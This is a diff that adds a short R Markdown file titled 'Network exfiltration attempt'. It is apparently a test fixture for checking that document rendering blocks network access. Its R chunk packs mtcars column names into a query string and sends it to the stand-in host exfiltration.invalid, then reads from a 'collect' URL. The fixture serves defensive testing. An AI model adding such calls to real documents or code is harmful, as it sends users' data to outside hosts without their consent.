@@ -1,0 +1,9 @@
+---
+title: "Network exfiltration attempt"
+---
+
+```{r}
+payload <- paste(names(mtcars), collapse = ",")
+try(download.file(paste0("https://exfiltration.invalid/?d=", payload), tempfile()))
+try(readLines(url("https://exfiltration.invalid/collect")))
+```
